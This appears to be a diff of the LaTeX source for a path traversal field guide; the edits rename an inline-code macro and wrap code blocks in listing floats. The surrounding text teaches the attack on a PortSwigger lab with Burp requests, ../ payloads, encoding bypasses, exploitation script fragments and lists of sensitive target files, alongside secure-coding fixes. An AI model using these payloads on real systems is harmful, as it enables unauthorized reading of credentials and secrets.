@@ -37,7 +37,7 @@
 \definecolor{traversalcolor}{rgb}{0.8,0.4,0.0}
 
 % Robust inline code
-\newcommand{\code}[1]{\texttt{\detokenize{#1}}}
+\newcommand{\inlinecode}[1]{\texttt{\detokenize{#1}}}
 \renewcommand{\kbd}[1]{\fbox{\texttt{\small #1}}}
 \newcommand{\filepath}[1]{\texttt{#1}}
 \newcommand{\traversal}[1]{\texttt{\color{traversalcolor}#1}}
@@ -63,7 +63,7 @@
 
 % ---------- Document metadata ----------
 \title{\textbf{Comprehensive Field Guide:\\File Path Traversal (Directory Traversal)}\\[0.5em]
-\large Simple Case---Reading Arbitrary Files via \code{../} Sequences\\[0.3em]
+\large Simple Case---Reading Arbitrary Files via \inlinecode{../} Sequences\\[0.3em]
 \normalsize Version 2.0}
 \author{Web Application Security Assessment Reference}
 \date{January 21, 2026}
@@ -72,11 +72,11 @@
 \maketitle
 
 \begin{abstract}
-\noindent This comprehensive field guide addresses \textbf{File Path Traversal} (also known as Directory Traversal, Dot-Dot-Slash attacks, or Local File Inclusion), a critical vulnerability class where user-controlled input is used to construct filesystem paths, allowing attackers to read (and sometimes write) files outside the intended directory. In the simple case covered here, an image-serving endpoint accepts a filename parameter that can be manipulated with \code{../} sequences to traverse up the directory tree and access sensitive system files like \code{/etc/passwd}.
+\noindent This comprehensive field guide addresses \textbf{File Path Traversal} (also known as Directory Traversal, Dot-Dot-Slash attacks, or Local File Inclusion), a critical vulnerability class where user-controlled input is used to construct filesystem paths, allowing attackers to read (and sometimes write) files outside the intended directory. In the simple case covered here, an image-serving endpoint accepts a filename parameter that can be manipulated with \inlinecode{../} sequences to traverse up the directory tree and access sensitive system files like \inlinecode{/etc/passwd}.
 
 This guide provides security professionals with:
 \begin{itemize}
-  \item Deep understanding of path resolution mechanics and the \code{../} sequence
+  \item Deep understanding of path resolution mechanics and the \inlinecode{../} sequence
   \item Systematic discovery methodologies for file-serving endpoints
   \item Complete manual exploitation workflow with Burp Suite
   \item Production-ready automation scripts with comprehensive error handling
@@ -85,7 +85,7 @@ This guide provides security professionals with:
   \item Testing checklists and evidence collection frameworks
 \end{itemize}
 
-\noindent\textbf{Key Insight:} Path traversal exploits the application's failure to properly validate or canonicalize user input before using it in filesystem operations. The \code{../} sequence means ``parent directory'' and allows escaping from the intended base directory to access any file readable by the application process.
+\noindent\textbf{Key Insight:} Path traversal exploits the application's failure to properly validate or canonicalize user input before using it in filesystem operations. The \inlinecode{../} sequence means ``parent directory'' and allows escaping from the intended base directory to access any file readable by the application process.
 \end{abstract}
 
 \tableofcontents
@@ -100,7 +100,7 @@ This guide provides security professionals with:
 This field guide serves as a practical reference for identifying, exploiting, and remediating path traversal vulnerabilities in web applications. The guide emphasizes:
 
 \begin{itemize}
-  \item \textbf{Path resolution mechanics}: Understanding how \code{../} sequences work at the filesystem level
+  \item \textbf{Path resolution mechanics}: Understanding how \inlinecode{../} sequences work at the filesystem level
   \item \textbf{Endpoint identification}: Recognizing file-serving functionality that may be vulnerable
   \item \textbf{Payload construction}: Building effective traversal sequences for different depths
   \item \textbf{Secure implementation}: Eliminating the vulnerability class through proper coding patterns
@@ -131,8 +131,8 @@ Successful exploitation of path traversal can lead to:
 \begin{itemize}
   \item \textbf{Sensitive file disclosure}: Configuration files, credentials, API keys, database connection strings
   \item \textbf{Source code exposure}: Application code revealing business logic, algorithms, and additional vulnerabilities
-  \item \textbf{Credential harvesting}: Password files (\code{/etc/shadow} if running as root), SSH keys, service accounts
-  \item \textbf{Environment variable leakage}: Via \code{/proc/self/environ} on Linux (may contain secrets)
+  \item \textbf{Credential harvesting}: Password files (\inlinecode{/etc/shadow} if running as root), SSH keys, service accounts
+  \item \textbf{Environment variable leakage}: Via \inlinecode{/proc/self/environ} on Linux (may contain secrets)
   \item \textbf{System reconnaissance}: Understanding server structure, installed software, configuration
   \item \textbf{Escalation to RCE}: In some cases, writing files (log poisoning) or combining with other vulnerabilities
 \end{itemize}
@@ -163,9 +163,9 @@ This guide must only be used on systems where you have explicit written authoriz
 \toprule
 \textbf{Path Type} & \textbf{Linux Example} & \textbf{Windows Example} \\
 \midrule
-Absolute Path & \code{/etc/passwd} & \code{C:\textbackslash Windows\textbackslash win.ini} \\
-Relative Path & \code{images/photo.jpg} & \code{images\textbackslash photo.jpg} \\
-Traversal Path & \code{../../../etc/passwd} & \code{..\textbackslash ..\textbackslash Windows\textbackslash win.ini} \\
+Absolute Path & \inlinecode{/etc/passwd} & \inlinecode{C:\textbackslash Windows\textbackslash win.ini} \\
+Relative Path & \inlinecode{images/photo.jpg} & \inlinecode{images\textbackslash photo.jpg} \\
+Traversal Path & \inlinecode{../../../etc/passwd} & \inlinecode{..\textbackslash ..\textbackslash Windows\textbackslash win.ini} \\
 \bottomrule
 \end{tabularx}
 \caption{Path types across operating systems}
@@ -173,9 +173,10 @@ Traversal Path & \code{../../../etc/passwd} & \code{..\textbackslash ..\textback
 
 \subsection{The Dot-Dot-Slash Sequence Explained}
 
-The \code{../} sequence (or \code{..\textbackslash} on Windows) is a special filesystem notation meaning ``move to the parent directory'':
+The \inlinecode{../} sequence (or \inlinecode{..\textbackslash} on Windows) is a special filesystem notation meaning ``move to the parent directory'':
 
-\begin{minted}[caption={How ../ resolves step-by-step in the filesystem}]{text}
+\begin{listing}[H]
+\begin{minted}{text}
 Current directory: /var/www/images/
 
 One level up:
@@ -194,16 +195,19 @@ Key insight: Once at root (/), additional ../ has no effect:
   ../../../../etc/passwd  -> /etc/passwd (same result)
   ../../../../../etc/passwd -> /etc/passwd (still same)
 \end{minted}
+\caption{How ../ resolves step-by-step in the filesystem}
+\end{listing}
 
-\begin{tipbox}[Why Excessive \code{../} Sequences Work]
-If you're unsure how many directory levels deep the application's base path is, simply use more \code{../} sequences than necessary. Once the path reaches the filesystem root (\code{/}), additional \code{../} sequences are ignored---you cannot traverse ``above'' the root directory.
+\begin{tipbox}[Why Excessive \inlinecode{../} Sequences Work]
+If you're unsure how many directory levels deep the application's base path is, simply use more \inlinecode{../} sequences than necessary. Once the path reaches the filesystem root (\inlinecode{/}), additional \inlinecode{../} sequences are ignored---you cannot traverse ``above'' the root directory.
 \end{tipbox}
 
 \subsection{The Vulnerable Code Pattern}
 
 Most path traversal vulnerabilities follow this pattern:
 
-\begin{minted}[caption={Vulnerable Python code pattern}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 # Server intends to serve images from /var/www/images/
 BASE_DIR = "/var/www/images/"
 filename = request.args.get("filename")  # User-controlled input!
@@ -223,6 +227,8 @@ file_path = BASE_DIR + filename
 with open(file_path, "rb") as f:
     return f.read()  # Returns /etc/passwd contents!
 \end{minted}
+\caption{Vulnerable Python code pattern}
+\end{listing}
 
 \subsection{Path Resolution Visualization}
 
@@ -264,21 +270,21 @@ with open(file_path, "rb") as f:
   \node[below=0.1cm of images, font=\scriptsize\color{green!60!black}] {Base directory};
   \node[below=0.1cm of passwd, font=\scriptsize\color{red!60!black}] {Target file};
 \end{tikzpicture}
-\caption{Visual representation of traversal from \code{/var/www/images/} to \code{/etc/passwd}}
+\caption{Visual representation of traversal from \inlinecode{/var/www/images/} to \inlinecode{/etc/passwd}}
 \end{figure}
 
-\subsection{Why \code{/etc/passwd} Is the Standard Test File}
+\subsection{Why \inlinecode{/etc/passwd} Is the Standard Test File}
 
 \begin{itemize}
   \item \textbf{World-readable}: Accessible by any user on Linux/Unix systems
-  \item \textbf{Predictable location}: Always at \code{/etc/passwd} on any Linux system
-  \item \textbf{Unique content}: Contains \code{root:x:0:0:} which is unmistakable and proves success
-  \item \textbf{Safe to read}: Does NOT contain actual password hashes (those are in \code{/etc/shadow})
+  \item \textbf{Predictable location}: Always at \inlinecode{/etc/passwd} on any Linux system
+  \item \textbf{Unique content}: Contains \inlinecode{root:x:0:0:} which is unmistakable and proves success
+  \item \textbf{Safe to read}: Does NOT contain actual password hashes (those are in \inlinecode{/etc/shadow})
   \item \textbf{Universal proof}: Standard proof-of-concept for demonstrating arbitrary file read
 \end{itemize}
 
 \begin{notebox}[Modern Password Storage]
-On modern Linux systems, password hashes are stored in \code{/etc/shadow}, which is only readable by root. The \code{/etc/passwd} file uses \code{x} as a placeholder in the password field. However, if the application runs as root (a serious misconfiguration), \code{/etc/shadow} becomes accessible.
+On modern Linux systems, password hashes are stored in \inlinecode{/etc/shadow}, which is only readable by root. The \inlinecode{/etc/passwd} file uses \inlinecode{x} as a placeholder in the password field. However, if the application runs as root (a serious misconfiguration), \inlinecode{/etc/shadow} becomes accessible.
 \end{notebox}
 
 % ============================================================
@@ -295,14 +301,14 @@ On modern Linux systems, password hashes are stored in \code{/etc/shadow}, which
 \toprule
 \textbf{URL Pattern} & \textbf{Description} \\
 \midrule
-\code{/image?filename=photo.jpg} & Query parameter with filename \\
-\code{/download?file=report.pdf} & Download functionality \\
-\code{/files/document.txt} & Path-based file serving \\
-\code{/static?path=css/style.css} & Static asset serving \\
-\code{/view?doc=manual.pdf} & Document viewer \\
-\code{/export?template=report.docx} & Template/export functionality \\
-\code{/avatar?user=john\&ext=png} & User content serving \\
-\code{/include?page=about.html} & Template inclusion \\
+\inlinecode{/image?filename=photo.jpg} & Query parameter with filename \\
+\inlinecode{/download?file=report.pdf} & Download functionality \\
+\inlinecode{/files/document.txt} & Path-based file serving \\
+\inlinecode{/static?path=css/style.css} & Static asset serving \\
+\inlinecode{/view?doc=manual.pdf} & Document viewer \\
+\inlinecode{/export?template=report.docx} & Template/export functionality \\
+\inlinecode{/avatar?user=john\&ext=png} & User content serving \\
+\inlinecode{/include?page=about.html} & Template inclusion \\
 \bottomrule
 \end{tabularx}
 \caption{Common file-serving URL patterns to investigate}
@@ -321,7 +327,8 @@ When browsing an application, watch for:
 
 \subsection{Phase 2: Analyze Request Structure}
 
-\begin{minted}[caption={Typical image-serving request captured in Burp}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 GET /image?filename=65.jpg HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
@@ -336,16 +343,19 @@ Content-Length: 45231
 
 [binary JPEG data - image displays in browser]
 \end{minted}
+\caption{Typical image-serving request captured in Burp}
+\end{listing}
 
 \begin{tipbox}[Key Discovery Point]
-When you see an endpoint like \code{/image?filename=65.jpg}, the \code{filename} parameter is being used server-side to construct a filesystem path. This is your attack surface---test what happens when you manipulate this parameter.
+When you see an endpoint like \inlinecode{/image?filename=65.jpg}, the \inlinecode{filename} parameter is being used server-side to construct a filesystem path. This is your attack surface---test what happens when you manipulate this parameter.
 \end{tipbox}
 
 \subsection{Phase 3: Test Path Handling Behavior}
 
 \subsubsection{Test 1: Absolute Path Acceptance}
 
-\begin{minted}[caption={Testing if absolute paths are accepted}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 GET /image?filename=/etc/passwd HTTP/1.1
 Host: target.example.com
 
@@ -364,10 +374,13 @@ Response C (Path prepended, file not found):
 HTTP/1.1 404 Not Found
 File not found: /var/www/images//etc/passwd
 \end{minted}
+\caption{Testing if absolute paths are accepted}
+\end{listing}
 
 \subsubsection{Test 2: Relative Path Traversal}
 
-\begin{minted}[caption={Testing relative path traversal with varying depth}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Start with minimal traversal --
 GET /image?filename=../etc/passwd HTTP/1.1
 
@@ -385,6 +398,8 @@ root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
 \end{minted}
+\caption{Testing relative path traversal with varying depth}
+\end{listing}
 
 % ============================================================
 \section{Manual Exploitation Workflow}
@@ -395,7 +410,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 \begin{enumerate}
   \item \textbf{Burp Suite Configuration}
   \begin{itemize}
-    \item Proxy listener on \code{127.0.0.1:8080}
+    \item Proxy listener on \inlinecode{127.0.0.1:8080}
     \item Browser configured to use Burp proxy
     \item Intercept initially OFF (capture passively)
     \item Project file created for evidence retention
@@ -404,14 +419,15 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   \item \textbf{Target Identification}
   \begin{itemize}
     \item Lab URL obtained from PortSwigger Web Security Academy
-    \item Lab objective: Retrieve contents of \code{/etc/passwd}
+    \item Lab objective: Retrieve contents of \inlinecode{/etc/passwd}
     \item Vulnerable endpoint: Image serving functionality
   \end{itemize}
 \end{enumerate}
 
 \subsection{Step 1: Browse Application and Identify Endpoint}
 
-\begin{minted}[caption={Step 1: Observe image loading requests in Burp HTTP History}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Browse the application homepage --
 -- Observe in Burp Proxy > HTTP history that images are loaded via: --
 
@@ -425,9 +441,11 @@ Content-Length: 45231
 
 [Binary JPEG data]
 \end{minted}
+\caption{Step 1: Observe image loading requests in Burp HTTP History}
+\end{listing}
 
 \begin{tipbox}[Discovery Observation]
-As the application loads, notice that product images are fetched via the \code{/image} endpoint with a \code{filename} parameter. These images are likely stored in a folder on the backend server---this is your first indication to test for path traversal.
+As the application loads, notice that product images are fetched via the \inlinecode{/image} endpoint with a \inlinecode{filename} parameter. These images are likely stored in a folder on the backend server---this is your first indication to test for path traversal.
 \end{tipbox}
 
 \subsection{Step 2: Send Request to Repeater}
@@ -435,14 +453,15 @@ As the application loads, notice that product images are fetched via the \code{/
 In Burp Suite:
 \begin{enumerate}
   \item Go to Proxy $\rightarrow$ HTTP history
-  \item Find the \code{GET /image?filename=65.jpg} request
+  \item Find the \inlinecode{GET /image?filename=65.jpg} request
   \item Right-click $\rightarrow$ ``Send to Repeater'' (or press \kbd{Ctrl+R})
   \item Switch to the Repeater tab
 \end{enumerate}
 
 \subsection{Step 3: Establish Baseline}
 
-\begin{minted}[caption={Step 3: Verify normal request works}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- In Repeater, send the original request --
 GET /image?filename=65.jpg HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -455,10 +474,13 @@ Content-Length: 45231
 
 [Binary image data]
 \end{minted}
+\caption{Step 3: Verify normal request works}
+\end{listing}
 
 \subsection{Step 4: Test Absolute Path}
 
-\begin{minted}[caption={Step 4: Test if absolute paths are accepted}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- Modify filename to absolute path --
 GET /image?filename=/etc/passwd HTTP/1.1
 Host: 0aXXXXXXXX.web-security-academy.net
@@ -471,10 +493,13 @@ No such file
 -- Interpretation: The server likely prepends a base directory --
 -- We need to use traversal sequences to escape it --
 \end{minted}
+\caption{Step 4: Test if absolute paths are accepted}
+\end{listing}
 
 \subsection{Step 5: Test Traversal Sequences}
 
-\begin{minted}[caption={Step 5: Add traversal sequences to escape base directory}]{http}
+\begin{listing}[H]
+\begin{minted}{http}
 -- The image is probably in something like /var/www/images/ --
 -- We need to go up 3+ directories to reach root --
 
@@ -495,20 +520,23 @@ games:x:5:60:games:/usr/games:/usr/sbin/nologin
 man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 ...
 \end{minted}
+\caption{Step 5: Add traversal sequences to escape base directory}
+\end{listing}
 
 \begin{warningbox}[Vulnerability Confirmed!]
-The server returned the contents of \code{/etc/passwd}! This confirms:
+The server returned the contents of \inlinecode{/etc/passwd}! This confirms:
 \begin{enumerate}
   \item The application is vulnerable to path traversal
   \item We can read arbitrary files on the server
   \item The application runs with sufficient privileges to read system files
-  \item The \code{root:x:0:0:} line proves we're reading the real passwd file
+  \item The \inlinecode{root:x:0:0:} line proves we're reading the real passwd file
 \end{enumerate}
 \end{warningbox}
 
 \subsection{Step 6: Understanding the Path Resolution}
 
-\begin{minted}[caption={How the path resolves on the server}]{text}
+\begin{listing}[H]
+\begin{minted}{text}
 Server base directory: /var/www/images/
 
 Our payload: ../../../etc/passwd
@@ -525,13 +553,15 @@ Resolution step by step:
 
 Final resolved path: /etc/passwd
 \end{minted}
+\caption{How the path resolves on the server}
+\end{listing}
 
 \begin{notebox}[Using Excessive Traversal Depth]
-If you're unsure how deep the base directory is, use more \code{../} sequences than necessary:
+If you're unsure how deep the base directory is, use more \inlinecode{../} sequences than necessary:
 \begin{minted}{text}
 ../../../../../../../../../etc/passwd
 \end{minted}
-Once at the root directory, additional \code{../} sequences have no effect---you cannot go ``above'' root.
+Once at the root directory, additional \inlinecode{../} sequences have no effect---you cannot go ``above'' root.
 \end{notebox}
 
 % ============================================================
@@ -540,7 +570,8 @@ Once at the root directory, additional \code{../} sequences have no effect---you
 
 \subsection{Complete Python Exploitation Script}
 
-\begin{minted}[caption={Full-featured path traversal exploitation script}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 #!/usr/bin/env python3
 """
 File Path Traversal - Exploitation Script (Simple Case)
@@ -648,10 +679,13 @@ def main():
 if __name__ == "__main__":
     main()
 \end{minted}
+\caption{Full-featured path traversal exploitation script}
+\end{listing}
 
 \subsection{Bash/Curl One-Liner}
 
-\begin{minted}[caption={Command-line exploitation with curl}]{bash}
+\begin{listing}[H]
+\begin{minted}{bash}
 #!/bin/bash
 # Path Traversal Exploit - Simple Case
 # Usage: ./exploit.sh https://target.example.com
@@ -677,6 +711,8 @@ else
     exit 1
 fi
 \end{minted}
+\caption{Command-line exploitation with curl}
+\end{listing}
 
 % ============================================================
 \section{Payload Reference}
@@ -688,14 +724,14 @@ fi
 \toprule
 \textbf{File Path} & \textbf{Description} \\
 \midrule
-\code{/etc/passwd} & User accounts (world-readable, standard PoC) \\
-\code{/etc/shadow} & Password hashes (root only) \\
-\code{/etc/hosts} & Host mappings \\
-\code{/proc/self/environ} & Environment variables (may contain secrets) \\
-\code{/proc/self/cmdline} & Process command line \\
-\code{/var/log/apache2/access.log} & Apache access logs \\
-\code{/home/<user>/.ssh/id\_rsa} & SSH private keys \\
-\code{/var/www/html/.env} & Application config \\
+\inlinecode{/etc/passwd} & User accounts (world-readable, standard PoC) \\
+\inlinecode{/etc/shadow} & Password hashes (root only) \\
+\inlinecode{/etc/hosts} & Host mappings \\
+\inlinecode{/proc/self/environ} & Environment variables (may contain secrets) \\
+\inlinecode{/proc/self/cmdline} & Process command line \\
+\inlinecode{/var/log/apache2/access.log} & Apache access logs \\
+\inlinecode{/home/<user>/.ssh/id\_rsa} & SSH private keys \\
+\inlinecode{/var/www/html/.env} & Application config \\
 \bottomrule
 \caption{Common Linux files for path traversal testing}
 \end{longtable}
@@ -706,10 +742,10 @@ fi
 \toprule
 \textbf{Encoding} & \textbf{Sequence} & \textbf{Use Case} \\
 \midrule
-Plain & \code{../} & Basic traversal \\
+Plain & \inlinecode{../} & Basic traversal \\
 URL encoded & \texttt{..\%2f} & Bypass basic filters \\
 Double encoded & \texttt{..\%252f} & Bypass double-decoding \\
-Backslash & \code{..\textbackslash} & Windows systems \\
+Backslash & \inlinecode{..\textbackslash} & Windows systems \\
 \bottomrule
 \caption{Traversal sequence encoding variations}
 \end{longtable}
@@ -729,7 +765,8 @@ Backslash & \code{..\textbackslash} & Windows systems \\
 
 \subsection{Secure Python Implementation}
 
-\begin{minted}[caption={Python: Secure file serving with pathlib}]{python}
+\begin{listing}[H]
+\begin{minted}{python}
 from pathlib import Path
 from flask import Flask, request, abort, send_file
 
@@ -758,10 +795,13 @@ def image():
 
     return send_file(candidate)
 \end{minted}
+\caption{Python: Secure file serving with pathlib}
+\end{listing}
 
 \subsection{Secure Node.js Implementation}
 
-\begin{minted}[caption={Node.js: Secure file serving}]{javascript}
+\begin{listing}[H]
+\begin{minted}{javascript}
 import path from "node:path";
 import fs from "node:fs";
 
@@ -788,6 +828,8 @@ app.get("/image", (req, res) => {
     return res.sendFile(resolved);
 });
 \end{minted}
+\caption{Node.js: Secure file serving}
+\end{listing}
 
 % ============================================================
 \section{Testing Checklist}
@@ -805,10 +847,10 @@ app.get("/image", (req, res) => {
 \subsection{Exploitation Checklist}
 
 \begin{itemize}[label=$\square$]
-  \item Test absolute path (\code{/etc/passwd})
-  \item Test basic traversal (\code{../../../etc/passwd})
+  \item Test absolute path (\inlinecode{/etc/passwd})
+  \item Test basic traversal (\inlinecode{../../../etc/passwd})
   \item Test excessive depth
-  \item Verify with \code{root:x:0:0:} pattern
+  \item Verify with \inlinecode{root:x:0:0:} pattern
   \item Document working payload
 \end{itemize}
 
@@ -820,9 +862,9 @@ app.get("/image", (req, res) => {
 \toprule
 \textbf{Target} & \textbf{Payload} \\
 \midrule
-Linux /etc/passwd & \code{../../../etc/passwd} \\
-Linux (more depth) & \code{../../../../../../etc/passwd} \\
-Windows win.ini & \code{..\textbackslash..\textbackslash..\textbackslash Windows\textbackslash win.ini} \\
+Linux /etc/passwd & \inlinecode{../../../etc/passwd} \\
+Linux (more depth) & \inlinecode{../../../../../../etc/passwd} \\
+Windows win.ini & \inlinecode{..\textbackslash..\textbackslash..\textbackslash Windows\textbackslash win.ini} \\
 \bottomrule
 \caption{Quick reference payloads}
 \end{longtable}
